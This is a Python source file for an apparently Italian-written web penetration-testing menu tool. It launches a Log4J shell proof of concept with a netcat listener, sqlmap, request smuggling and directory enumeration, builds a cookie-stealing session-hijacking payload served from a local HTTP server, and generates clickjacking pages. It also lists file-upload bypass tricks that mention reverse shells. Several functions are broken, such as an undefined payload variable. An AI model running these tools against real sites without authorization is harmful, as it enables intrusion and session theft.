from logging import warning
import os
from lib.config import *
import time,socket
from pathlib import Path
import webbrowser
from tabulate import tabulate
import platform
import getpass

username=getpass.getuser()

'''
WAF DETECTION
'''
def waf_detection():
    if platform.system() == "Windows":
        os.system("cls")
    else:
        os.system("clear")
    print(f"{ok}WAF DETECTION\n")
    try:
        url=input(f"{warning} Insert url: ")
        if platform.system() == "Windows":
            root_waf=f"{root_path}wafw00f\\main.py"
            comando=f"python3 {root_waf} {url} -a -v "
            os.system(comando)
        else:
            os.system(f"wafw00f {url} -a -v")
    except Exception as e:
        print(f"{error} An error is occured, {e}")
        
    print("\n")
    x=input(f"{ok} WAF detection completed. Press enter")
    if platform.system() == "Windows":
        os.system("cls")
    else:
        os.system("clear")
    time.sleep(1)



'''
Log4J Scanner
'''
def log4J_shell():
    if platform.system() == "Windows":
        os.system("cls")
    else:
        os.system("clear")
    print(f"{ok} Log4J Scanner\n")
    ip=input("Insert your IP (tap if use the VPN): ")
    print(f"{ok} Launch in a new terminal this command: wsl nc -lvnp 9001")
    #os.system("cmd /c start powershell -Command { wsl nc -lvnp 9001 }")
    os.system(f"python3 {root_path}\\log4j-shell-poc\\poc.py --userip {ip} --webport 80 --lport 9001")
    

'''
HTTP VERB TAMPERING 
'''
def verb_tampering():
    if platform.system() == "Windows":
        os.system("cls")
    else:
        os.system("clear")
    print(f"{ok} HTTP VERB TAMPERING\n")
    x=input(f"{warning} Disable proxy, then press enter")
    os.system(f"python3 {root_path}\\httpmethods\\httpmethods.py -h ")
    print("\n") 
    url=input(f"{warning} Insert url: ")
    params=input(f"{warning} Insert others params (press enter if you don't add any params): ")
    if params == "":
        os.system(f"python3 {root_path}\\httpmethods\\httpmethods.py {url} ")
    else:
        os.system(f"python3 {root_path}\\httpmethods\\httpmethods.py {url} {params}")
    
    x=input(f"{ok} Check HTTP Verb Tampering completed. Press enter")

    if platform.system() == "Windows":
        os.system("cls")
    else:
        os.system("clear")
    time.sleep(1)


'''
HTTP Request smuggling
'''
def smuggling():
    if platform.system() == "Windows":
        os.system("cls")
    else:
        os.system("clear")
    print(f"{ok} HTTP REQUEST SMUGGLING\n")
    x=input(f"{warning} Before pressing any button, look this link of Port Swigger and verify the HTTP Request smuggling vulnerability: https://portswigger.net/web-security/request-smuggling")
    os.system(f"python3 {root_path}\\smuggling\\smuggler\\smuggler.py -h ")
    print("\n")
    url=input(f"{warning} Insert url: ")
    params=input(f"{warning} Insert others params (press enter if you don't add any params): ")
    if params == "":
        os.system(f"python3 {root_path}\\smuggling\\smuggler\\smuggler.py -u {url} ")
    else:
        os.system(f"python3 {root_path}\\smuggling\\smuggler\\smuggler.py -u {url} {params}")
    
    print(f"{ok} C:\\Users\\{username}\\Desktop\\PERSEUS\\tools\\smuggling\\smuggler\\payloads you can find the possible payload")

    choose=input(f"{warning} Find potential (1) CLTE or (2) TECL?: ")
    choose=int(choose)
    if choose == 1:
        os.system(f"python3 {root_path}\\smuggling\\HTTP-Smuggling-Calculator\\CLTE_DesyncCalculator_.py")
    else:
        os.system(f"python3 {root_path}\\smuggling\\HTTP-Smuggling-Calculator\\TECL_DesyncCalculator.py")
    
    x=input(f"{ok} HTTP Request smuggling completed. Press enter")

    if platform.system() == "Windows":
        os.system("cls")
    else:
        os.system("clear")
    time.sleep(1)


'''
CHECK HEADER
'''
def check_header():
    if platform.system() == "Windows":
        os.system("cls")
    else:
        os.system("clear")
    print(f"{ok} CHECK SECURITY HEADERS\n")
    if platform.system() == "Windows":
        try:
            path=f"{root_path}Check_Header\\shcheck.py"
            url=input(f"{warning} Insert url: ")
            command2=f"python3 {path} {url}"
            os.system(command2)
        except Exception as e:
            print(f"{error} An error is occured, {e}")
    else:
        try:
            path=f"{root_path}Check_Header/shcheck.py"
            url=input(f"{warning} Insert url: ")
            command2=f"python3 {path} {url}"
            os.system(command2)
        except Exception as e:
            print(f"{error} An error is occured, {e}")
        
    x=input(f"{ok} Check Headers completed. Press enter")

    if platform.system() == "Windows":
        os.system("cls")
    else:
        os.system("clear")
    time.sleep(1)



'''
HOST HEADER INJECTION
'''
def hostHeaderInjection():
    if platform.system() == "Windows":
        os.system("cls")
    else:
        os.system("clear")
    try:
        time.sleep(1)
        print(f"{ok} Detection HTTP Host Header Injection")
        webbrowser.open(f"https://github.com/daffainfo/AllAboutBugBounty/blob/master/Host%20Header%20Injection.md")
        print()
    except Exception as e:
        print(f"{error} An error is occured, {e}")
    x=input(f"{ok} HTTP Host Header Injection described. Press enter")
    if platform.system() == "Windows":
        os.system("cls")
    else:
        os.system("clear")
    time.sleep(1)



'''
SESSION HIJACKING
'''
def session_hijacking():
    if platform.system() == "Windows":
        os.system("cls")
    else:
        os.system("clear")
    print(f"{ok}SESSION HIJACKING\n")
    if platform.system() == "Windows":
        try:
            payload_array=[]
            command_server=f"python3 -m http.server 80"
            command=f'start cmd.exe @cmd /k "{command_server}"'
            os.system(command)
            try:
                with open(f"{root_path}session_hijacking\\cookie.txt","r") as file1:
                    reading=file1.readlines()
                    for read in reading:
                        read=str(read)
                        payload_array += [read]

            except Exception as e:
                pass
            
            rep = []
            for x in payload_array:
                rep.append(x.replace("\n", ""))
            IP=input(f"{warning} Insert OWN IP: ")
            IP=IP.replace(".","%2E")
            final_payload=rep[0]+IP+rep[1]
            print(final_payload)
            
            url=input(f"{warning} Insert url and put * in the parameter where do you want insert session payload: ")
            if '*' in url:
                url=str(url)
                url=url.replace("*",payload)
            print(f"{ok} {url}")
            

        except Exception as e:
            print(f"{error} An error is occured, {e}")
    else:
        try:
            command_server=f"sudo python3 -m http.server 80"
            command=f'gnome-terminal -x  sh -c "{command_server}"'
            os.system(command)
            try:
               with open(f"{root_path}session_hijacking/cookie.txt","r") as file1:
                    reading=file1.readlines()
                    for read in reading:
                        read=str(read)
                        payload_array += [read]

            except Exception as e:
                pass
            
            rep = []
            for x in payload_array:
                rep.append(x.replace("\n", ""))

            IP=input(f"{warning} Insert OWN IP: ")
            IP=IP.replace(".","%2E")
            final_payload=rep[0]+IP+rep[1]
            print(final_payload)
            url=input(f"{warning} Insert url and put * in the parameter where do you want insert session payload: ")
            if '*' in url:
                url=str(url)
                url=url.replace("*",payload)
            print(f"{ok} {url}")

        except Exception as e:
            print(f"{error} An error is occured, {e}")
    
    print("\n")
    x=input(f"{ok} Session Hijacking completed. Press enter")
    if platform.system() == "Windows":
        os.system("cls")
    else:
        os.system("clear")
    time.sleep(1)


'''
UNRESTRICTED FILE UPLOAD
'''
def unrestricted_trick():
    if platform.system() == "Windows":
        os.system("cls")
    else:
        os.system("clear")
    try:
        time.sleep(1)
        print(f"{ok} Bypassing File Upload Restriction")
        print()
        print(f"{ok} 1. Use an exe file and try to upload {Fore.YELLOW}(Hacked.exe){Fore.WHITE}")
        print(f"{Fore.RED}==================================================================================================================={Fore.WHITE}")
        print(f"{ok} 2. Change {Fore.YELLOW}Content-type{Fore.WHITE} of the POST Request")
        print(f"{Fore.RED}==================================================================================================================={Fore.WHITE}")
        print(f"{ok} 3. Change the extension of the file (Hacked.exe) {Fore.YELLOW}from exe to (jpg,png,pdf,txt,php5...){Fore.WHITE} in order to bypass soft constraints")
        print(f"{Fore.RED}==================================================================================================================={Fore.WHITE}")
        print(f"{ok} 4. Modify the extension with Uppercase of the file or add byte-null or double extension: (Hacked.exe ---> Hacked.EXE) or (Hacked.exe --> Hacked.exe%00.jpg)")
        print(f"{Fore.RED}==================================================================================================================={Fore.WHITE}")
        print(f"{ok} 5. Upload a legitimate image using burp and verify upload is successful. Then send the previous request to burp repeater. After the legitimate image data in the request, attempt to inject payloads (injection payloads or a reverse shell). Finally, submit the request")
        print(f"{Fore.RED}==================================================================================================================={Fore.WHITE}")
        print(f"{ok} 6. Magic Bytes: Magic numbers are the first few bytes of a file that are unique to a particular file type. These unique bits are referred to as magic numbers, also sometimes referred to as a file signature.\n")
        print(f"\t{ok} - PDF: %PDF-1.5, %µµµµ\n")
        print(f"\t{ok} - PNG: 89 50 4e 47 0d 0a 1a 0a \n")
        print(f"\t{ok} - ZIP: 50 4b 03 04\n")
        print()
    except Exception as e:
        print(f"{error} An error is occured, {e}")
    x=input(f"{ok} Unrestricted file upload trick described. Press enter")
    if platform.system() == "Windows":
        os.system("cls")
    else:
        os.system("clear")
    time.sleep(1)


'''
ENUMERATION
'''
def enumeration():
    scelta=input(f"{warning} (1) Dirsearch (2) LinkFinder on JS file (3) Search Finder on JS file: ")
    scelta=int(scelta)
    if(scelta==1):
        dirsearch()
    elif(scelta==2):
        checkPathOnJS()
    else:
        checkdataOnJS()

#TODO: Solo Windows no LINUX
def checkdataOnJS():
    if platform.system() == "Windows":
        os.system("cls")
    else:
        os.system("clear")
    time.sleep(1)
    print(f"{ok}Search Finder on JS\n")
    try:
        os.system(f"python3 {root_path}\\SecretFinder\\SecretFinder.py -h")
        print("\n")
        url=input(f"{warning} Insert url: ")
        params=input(f"{warning} Insert other params (cookies ecc): ")
        os.system(f"wsl python3 {root_wsl2} -i {url} {params}")

    except Exception as e:
        print(f"{error} An error is occured, {e}")
    
    print("\n")
    try:
        trovato=0
        for root, dirs, files in os.walk(f"C:\\Users\\{username}\\Desktop\\PERSEUS"):
            if "output.html" in files or "output" in files:
                trovato=1
                webbrowser.open(f"C:\\Users\\{username}\\Desktop\\PERSEUS\\output.html",new=2)
        
        if trovato==0:
            print(f"{warning} No Search found in the JS file..")

        x=input(f"{ok} Search Finder on JS File completed. Press enter")
        if platform.system() == "Windows":
            if trovato==1:
                os.system(f"del {root}\\output.html")
            os.system("cls")
            time.sleep(1)
        else:
            if trovato==1:
                os.system(f"rm {root}/output.html")
            os.system("clear")
            time.sleep(1)
    except UnboundLocalError as e:
        print(f"{error} Generale error: {e} ")
        pass


def checkPathOnJS():
    if platform.system() == "Windows":
        os.system("cls")
    else:
        os.system("clear")
    time.sleep(1)
    print(f"{ok}Link Finder on JS\n")
    try:
        url=input(f"{warning} Insert url: ")
        cookies=input(f"{warning} Insert Cookie in necessary otherwise type none: ")
        if platform.system() == "Windows":
            if cookies=="none":
                os.system(f"wsl python3 {root_wsl} -i {url}")
            else:
                os.system(f"wsl python3 {root_wsl} -i {url} c {cookies}")
        else:
            if cookies=="none":
                os.system(f"python3 {root_path}/LinkFinder/linkfinder.py -i {url}")
            else:
                os.system(f"python3 {root_path}/LinkFinder/linkfinder.py -i {url} -c {cookies}")

    except Exception as e:
        print(f"{error} An error is occured, {e}")

    print("\n")
    trovato=0
    for root, dirs, files in os.walk(f"C:\\Users\\{username}\\Desktop\\PERSEUS"):
        if "output.html" in files or "output" in files:
            trovato=1
            webbrowser.open(f"C:\\Users\\{username}\\Desktop\\PERSEUS\\output.html",new=2)
    
    if trovato==0:
        print(f"{warning} No Link found in the JS file..")

    x=input(f"{ok} Link Finder on JS File completed. Press enter")
    if platform.system() == "Windows":
        if trovato==1:
            os.system(f"del {root}\\output.html")
        os.system("cls")
        time.sleep(1)
    else:
        if trovato==1:
            os.system(f"rm {root}/output.html")
        os.system("clear")
        time.sleep(1)

def dirsearch():
    if platform.system() == "Windows":
        os.system("cls")
    else:
        os.system("clear")
    print(f"{ok} DIR SEARCH\n")
    if platform.system() == "Windows":
        try:
            path=f"{root_path}dirsearch\\dirsearch.py"
            url=input(f"{warning} Insert url: ")
            help=f"python3 {path} -h"
            choose_help=input(f"{warning} (1) Show help functions (2) Run standard dirsearch (3) built command-line dirsearch: ")
            choose_help=int(choose_help)
            if choose_help == 1:
                os.system(help)
            elif choose_help == 2:
                os.system(f"python3 {path} -u {url}")
            else:
                options=input(f"{warning} Insert other option (es --deep-recursive): ")
                os.system(f"python3 {path} -u {url} {options}")

        except Exception as e:
            print(f"{error} An error is occured, {e}")
    else:
        try:
            path=f"{root_path}dirsearch/dirsearch.py"
            url=input(f"{warning} Insert url: ")
            help=f"python3 {path} -h"
            choose_help=(f"{warning} (1) Show help functions (2) Run standard dirsearch (3) built command-line dirsearch: ")
            choose_help=int(choose_help)
            if choose_help == 1:
                os.system(help)
            elif choose_help == 2:
                os.system("python3 {path} -u {url}")
            else:
                options=input(f"{warning} Insert other option (es --deep-recursive): ")
                os.system("python3 {path} -u {url} {options}")

        except Exception as e:
            print(f"{error} An error is occured, {e}")
    
    x=input(f"{ok} Dir search completed. Press enter")
    if platform.system() == "Windows":
        os.system("cls")
    else:
        os.system("clear")
    time.sleep(1)


'''
Cross-Site Scripting
'''
def cross_site_scripting():
    if platform.system() == "Windows":
        os.system("cls")
    else:
        os.system("clear")

    count=1
    array2=[]
    array3=[]
    if platform.system() == "Windows":
        path=f"{root_path}xss_payload\\xss.txt"
        with open(path,"r") as file1:
            lines=file1.readlines()
            for line in lines:
                if count%2!=0:
                    array2.append(line)
                else:
                    array3.append(line)
                count=count+1
    else:
        path=f"{root_path}xss_payload/xss.txt"
        with open(path,"r") as file1:
            lines=file1.readlines()
            for line in lines:
                if count%2!=0:
                    array2.append(line)
                else:
                    array3.append(line)
                count=count+1

    print(tabulate({"URL Decode": array2, "URL Encode": array3},headers="keys"))
    print("\n")
    x=input(f"{ok} Check XSS completed. Press enter")
    if platform.system() == "Windows":
        os.system("cls")
    else:
        os.system("clear")
    time.sleep(1)

'''
ClickJacking
'''
def clickjacking():
    if platform.system() == "Windows":
        os.system("cls")
    else:
        os.system("clear")
    print(f"{ok} Clickjacking\n")
    
    if platform.system() == "Windows":
        try:
            url=input(f"{warning} Insert url: ")
            with open(f"{root_path}\\clickjacking.txt" ,encoding="utf8") as reading:
                lines=reading.readlines()
                lines[7] = f'<iframe src="{url}" width=100% height=100% style=”opacity: 0.5;”></iframe>'
            
            a_file = open("clickjacking.html", "w")
            a_file.writelines(lines)
            a_file.close()
            print(f"{ok} File ready on the VAPT dir..\n ")
            webbrowser.open(f"{root}\\clickjacking.html")
        except Exception as e:
            print(f"{error} An error is occured, {e}")
    else:
        try:
            url=input(f"{warning} Insert url: ")
            with open(f"{root_path}/clickjacking.txt" ,encoding="utf8") as reading:
                lines=reading.readlines()
                lines[7] = f'<iframe src="{url}" width=100% height=100% style=”opacity: 0.5;”></iframe>'
            
            a_file = open("clickjacking.html", "w")
            a_file.writelines(lines)
            a_file.close()
            print(f"{ok} File ready on the VAPT dir..\n ")
            webbrowser.open(f"{root}/clickjacking.html")
        except Exception as e:
            print(f"{error} An error is occured, {e}")
    
    x=input(f"{ok} Clickjacking completed. Press enter")
    if platform.system() == "Windows":
        os.system("cls")
    else:
        os.system("clear")
    time.sleep(1)


'''
SQLMap
'''
def sqlmap():
    go=True
    list_No=["No","N","no","n"]
    if platform.system() == "Windows":
        os.system("cls")
    else:
        os.system("clear")
    print(f"{ok}SQLMap\n")
    if platform.system() == "Windows":
        try:
            while(go):
                cache_sql_map=f"C:\\Users\\{username}\\AppData\\Local\\sqlmap\\*"
                command_cache=f'powershell.exe "Remove-Item  {cache_sql_map} -Recurse -Force"'
                os.system(command_cache)
                print(f"{ok}SQLmap cache cleaned...")
                time.sleep(1)
                file_post=f"{root}\\post.txt"
                path=f"python3 {root_path}sqlmap\\sqlmap.py -r {file_post}"
                insert_command=input(f"{warning} Insert sqlmap options (--tamper=space2comment,--banner): ")
                command=f"{path} {insert_command}"
                os.system(command)
                check=input("Run sqlmap again?: ")
                if check in list_No:
                    go=False
        except Exception as e:
            print(f"{error} An error is occured, {e}")
    else:
        file_post=f"{root}/post.txt"
        path=f"python3 {root_path}sqlmap/sqlmap.py -r {file_post}"
        insert_command=input(f"{warning} Insert sqlmap options (--tamper=space2comment,--banner): ")
        command=f"{path} {insert_command}"
        os.system(command)
    x=input(f"{ok} SQLMap completed. Press enter")
    if platform.system() == "Windows":
        os.system("cls")
    else:
        os.system("clear")
    time.sleep(1)